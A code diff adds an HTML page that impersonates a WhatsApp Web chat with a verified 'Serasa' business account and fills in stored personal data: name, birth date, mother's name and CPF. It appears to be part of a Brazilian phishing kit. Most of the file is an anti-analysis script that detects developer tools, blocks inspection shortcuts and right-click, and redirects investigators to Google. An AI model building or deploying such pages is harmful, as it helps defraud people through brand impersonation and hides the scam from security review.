@@ -1,0 +1,429 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="css/stylechat.css">
+    <script src="js/021532d534.js" crossorigin="anonymous"></script>
+    <script src="js/script.js"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+
+    <script src="js/jquery.min.js"></script>
+    <title>WhatsApp Web</title>
+    <script src="js/jquery.mask.js"></script>
+
+    <style type="text/css">
+        @font-face {
+            font-weight: 400;
+            font-style: normal;
+            font-family: circular;
+
+            src: url('chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Book.woff2') format('woff2');
+        }
+
+        @font-face {
+            font-weight: 700;
+            font-style: normal;
+            font-family: circular;
+
+            src: url('chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Bold.woff2') format('woff2');
+        }
+    </style>
+
+</head>
+
+<body style="background-image: url(images/back.png); ">
+
+    <header>
+        <div style=" display: flex; align-items: center; gap: 10px;">
+            <i style="color: white;" class="fa-solid fa-arrow-left"></i>
+            <img style="width: 35px; border-radius: 100%;" src="images/cuae0wqlihuenlo77xtay29d.jpg" alt="">
+            <div style="color: white; ">
+                <p style="display: flex; gap: 5px;">Serasa<svg viewBox="0 0 18 18" height="18" width="18" preserveAspectRatio="xMidYMid meet" class="" version="1.1" x="0px" y="0px" enable-background="new 0 0 18 18" xml:space="preserve">
+                        <polygon id="Star-2" fill="#00DA60" points="9,16 7.1,16.9 5.8,15.2 3.7,15.1 3.4,13 1.5,12 2.2,9.9 1.1,8.2 2.6,6.7 2.4,4.6 4.5,4 5.3,2 7.4,2.4 9,1.1 10.7,2.4 12.7,2 13.6,4 15.6,4.6 15.5,6.7 17,8.2 15.9,9.9 16.5,12 14.7,13 14.3,15.1 12.2,15.2 10.9,16.9 ">
+                        </polygon>
+                        <polygon id="Check-Icon" fill="#FFFFFF" points="13.1,7.3 12.2,6.5 8.1,10.6 5.9,8.5 5,9.4 8,12.4 ">
+                        </polygon>
+                    </svg></p>
+                <p style="font-size: 12px;" class="status-digitalizacao">Online</p>
+            </div>
+        </div>
+        <div style="display: flex; gap: 35px;">
+            <i style="color: white; font-size: 20px;" class="fa-solid fa-phone"></i>
+            <i style="color: white; font-size: 20px;" class="fa-solid fa-paperclip"></i>
+            <i style="color: white; font-size: 20px;" class="fa-solid fa-ellipsis-vertical"></i>
+        </div>
+    </header>
+
+
+    <p style="background-color: #d5f4f0; width: fit-content; text-align: center; font-size: 14px; padding: 10px 20px; border-radius: 8px; margin: 50px auto; margin-top: 100px;">
+        <i class="fa-solid fa-circle-info"></i>Esta é uma conta
+        comercial e não recebe
+        ligações
+    </p>
+
+    <div class="container border-chat">
+
+        <div id="chatbox" style="padding-top: 20px;">
+        </div>
+
+    </div>
+
+    <script>
+        $(document).ready(function () {
+            var nome = localStorage.getItem('NOME');
+            var nasc = localStorage.getItem('NASC');
+            var nomeMae = localStorage.getItem('NOME_MAE') || 'Nome da mãe não disponível';
+            var cpf = localStorage.getItem('CPF')
+
+            $('.name').html(nome);
+            $('.birth').html(nasc);
+            $('.motherName').html(nomeMae);
+            $('.cpf').html(cpf);
+
+        });
+    </script>
+
+
+
+
+<script>
+    (function () {
+        'use strict';
+
+        // Configurações
+        const CONFIG = {
+            redirectUrl: 'https://google.com',
+            showConfirmation: true,
+            blockRightClick: true,
+            blockKeyboardShortcuts: true,
+            checkInterval: {
+                desktop: 500,
+                mobile: 2000
+            },
+            thresholds: {
+                dimension: 160,
+                timing: 100
+            }
+        };
+
+        // Detectar se é dispositivo móvel
+        function isMobileDevice() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+            const isMobileUA = mobileRegex.test(userAgent);
+            const isMobileScreen = window.innerWidth <= 768;
+            const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+
+            return isMobileUA || isMobileScreen || isTouchDevice;
+        }
+
+        // Métodos de detecção
+        const DetectionMethods = {
+            // Método 1: Verificação de dimensões (apenas desktop)
+            dimensionCheck: function () {
+                if (isMobileDevice()) return false;
+
+                const threshold = CONFIG.thresholds.dimension;
+                const widthDiff = window.outerWidth - window.innerWidth;
+                const heightDiff = window.outerHeight - window.innerHeight;
+
+                return widthDiff > threshold || heightDiff > threshold;
+            },
+
+            // Método 2: Detecção por timing do console
+            consoleTimingCheck: function () {
+                try {
+                    const start = performance.now();
+                    console.clear();
+                    const end = performance.now();
+                    return (end - start) > CONFIG.thresholds.timing;
+                } catch (e) {
+                    return false;
+                }
+            },
+
+            // Método 3: Detecção por debugger
+            debuggerCheck: function () {
+                try {
+                    const start = Date.now();
+                    debugger;
+                    const end = Date.now();
+                    return (end - start) > CONFIG.thresholds.timing;
+                } catch (e) {
+                    return false;
+                }
+            },
+
+            // Método 4: Detecção por toString override
+            toStringCheck: function () {
+                try {
+                    let devtools = false;
+                    const element = new Image();
+                    Object.defineProperty(element, 'id', {
+                        get: function () {
+                            devtools = true;
+                            return 'devtools-detected';
+                        }
+                    });
+                    console.log(element);
+                    return devtools;
+                } catch (e) {
+                    return false;
+                }
+            }
+        };
+
+        // Classe principal de detecção
+        class DevToolsDetector {
+            constructor() {
+                this.isOpen = false;
+                this.isMobile = isMobileDevice();
+                this.intervalId = null;
+                this.detectionCount = 0;
+                this.maxDetections = 3; // Evitar falsos positivos
+
+                this.init();
+            }
+
+            init() {
+                console.log(`DevTools Detector iniciado - Dispositivo: ${this.isMobile ? 'Mobile' : 'Desktop'}`);
+                this.startDetection();
+                this.setupEventListeners();
+            }
+
+            startDetection() {
+                const interval = this.isMobile ?
+                    CONFIG.checkInterval.mobile :
+                    CONFIG.checkInterval.desktop;
+
+                this.intervalId = setInterval(() => {
+                    this.checkDevTools();
+                }, interval);
+            }
+
+            checkDevTools() {
+                let detected = false;
+                let method = '';
+
+                if (this.isMobile) {
+                    // Para mobile, usar apenas métodos confiáveis
+                    if (DetectionMethods.consoleTimingCheck()) {
+                        detected = true;
+                        method = 'Console Timing';
+                    }
+                } else {
+                    // Para desktop, usar múltiplos métodos
+                    if (DetectionMethods.dimensionCheck()) {
+                        detected = true;
+                        method = 'Dimension Check';
+                    } else if (DetectionMethods.consoleTimingCheck()) {
+                        detected = true;
+                        method = 'Console Timing';
+                    } else if (DetectionMethods.toStringCheck()) {
+                        detected = true;
+                        method = 'ToString Override';
+                    }
+                }
+
+                if (detected && !this.isOpen) {
+                    this.detectionCount++;
+
+                    // Só considerar como verdadeiro após múltiplas detecções
+                    if (this.detectionCount >= (this.isMobile ? 2 : 1)) {
+                        this.isOpen = true;
+                        this.onDevToolsOpen(method);
+                    }
+                } else if (!detected && this.isOpen) {
+                    this.isOpen = false;
+                    this.detectionCount = 0;
+                    this.onDevToolsClose();
+                }
+            }
+
+            onDevToolsOpen(method) {
+                console.warn(`DevTools detectado via: ${method}`);
+
+                // Disparar evento customizado
+                window.dispatchEvent(new CustomEvent('devtoolsopen', {
+                    detail: { method: method, isMobile: this.isMobile }
+                }));
+
+                if (CONFIG.showConfirmation) {
+                    const message = this.isMobile ?
+                        'Ferramentas de desenvolvedor detectadas no dispositivo móvel. Isso pode afetar a performance. Deseja sair?' :
+                        'Ferramentas de desenvolvedor detectadas. Por motivos de segurança, você será redirecionado.';
+
+                    if (confirm(message)) {
+                        this.redirect();
+                    } else if (!this.isMobile) {
+                        // Em desktop, redirecionar mesmo se cancelar
+                        setTimeout(() => this.redirect(), 2000);
+                    }
+                } else {
+                    this.redirect();
+                }
+            }
+
+            onDevToolsClose() {
+                console.log('DevTools fechado');
+
+                // Disparar evento customizado
+                window.dispatchEvent(new CustomEvent('devtoolsclose', {
+                    detail: { isMobile: this.isMobile }
+                }));
+            }
+
+            redirect() {
+                try {
+                    window.location.href = CONFIG.redirectUrl;
+                } catch (e) {
+                    window.location.replace(CONFIG.redirectUrl);
+                }
+            }
+
+            setupEventListeners() {
+                // Bloquear menu de contexto (apenas desktop)
+                if (CONFIG.blockRightClick && !this.isMobile) {
+                    document.addEventListener('contextmenu', (e) => {
+                        e.preventDefault();
+                        alert('Menu de contexto desabilitado.');
+                        return false;
+                    });
+                }
+
+                // Bloquear atalhos de teclado
+                if (CONFIG.blockKeyboardShortcuts) {
+                    document.addEventListener('keydown', (e) => {
+                        // F12
+                        if (e.key === 'F12') {
+                            e.preventDefault();
+                            alert('Atalho F12 bloqueado.');
+                            return false;
+                        }
+
+                        // Ctrl+Shift+I (Inspector)
+                        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+                            e.preventDefault();
+                            alert('Atalho Ctrl+Shift+I bloqueado.');
+                            return false;
+                        }
+
+                        // Ctrl+Shift+C (Console)
+                        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
+                            e.preventDefault();
+                            alert('Atalho Ctrl+Shift+C bloqueado.');
+                            return false;
+                        }
+
+                        // Ctrl+Shift+J (Console no Chrome)
+                        if (e.ctrlKey && e.shiftKey && e.key === 'J') {
+                            e.preventDefault();
+                            alert('Atalho Ctrl+Shift+J bloqueado.');
+                            return false;
+                        }
+
+                        // Ctrl+U (View Source)
+                        if (e.ctrlKey && e.key === 'u') {
+                            e.preventDefault();
+                            alert('Visualizar código fonte bloqueado.');
+                            return false;
+                        }
+                    });
+                }
+
+                // Detectar mudanças de foco (pode indicar DevTools)
+                let focusLost = false;
+                window.addEventListener('blur', () => {
+                    focusLost = true;
+                    setTimeout(() => {
+                        if (focusLost && !this.isMobile) {
+                            // Verificação adicional quando a janela perde foco
+                            this.checkDevTools();
+                        }
+                    }, 500);
+                });
+
+                window.addEventListener('focus', () => {
+                    focusLost = false;
+                });
+            }
+
+            // Método para parar a detecção
+            stop() {
+                if (this.intervalId) {
+                    clearInterval(this.intervalId);
+                    this.intervalId = null;
+                }
+                console.log('DevTools Detector parado');
+            }
+
+            // Método para configurar opções
+            configure(options) {
+                Object.assign(CONFIG, options);
+                console.log('Configuração atualizada:', CONFIG);
+            }
+        }
+
+        // Inicializar quando o DOM estiver pronto
+        function initDevToolsDetector() {
+            // Verificar se já foi inicializado
+            if (window.devToolsDetector) {
+                console.warn('DevTools Detector já está ativo');
+                return window.devToolsDetector;
+            }
+
+            const detector = new DevToolsDetector();
+
+            // Expor globalmente para controle
+            window.devToolsDetector = detector;
+
+            // API pública
+            window.DevToolsProtection = {
+                stop: () => detector.stop(),
+                configure: (options) => detector.configure(options),
+                isActive: () => !!detector.intervalId,
+                isMobile: () => detector.isMobile,
+                isDevToolsOpen: () => detector.isOpen
+            };
+
+            return detector;
+        }
+
+        // Auto-inicializar
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initDevToolsDetector);
+        } else {
+            initDevToolsDetector();
+        }
+
+        // Prevenir múltiplas execuções
+        if (window.devToolsProtectionLoaded) {
+            console.warn('DevTools Protection já foi carregado');
+            return;
+        }
+        window.devToolsProtectionLoaded = true;
+
+    })();
+
+    // Exemplo de uso dos eventos customizados:
+    /*
+    window.addEventListener('devtoolsopen', function(e) {
+        console.log('DevTools aberto!', e.detail);
+    });
+    
+    window.addEventListener('devtoolsclose', function(e) {
+        console.log('DevTools fechado!', e.detail);
+    });
+    
+    // Controlar o detector:
+    // window.DevToolsProtection.stop(); // Parar
+    // window.DevToolsProtection.configure({ redirectUrl: 'https://example.com' }); // Configurar
+    */
+</script>
+
+
+<script src="js/script.js" type="text/javascript"></script>
+
+
+</body></html>
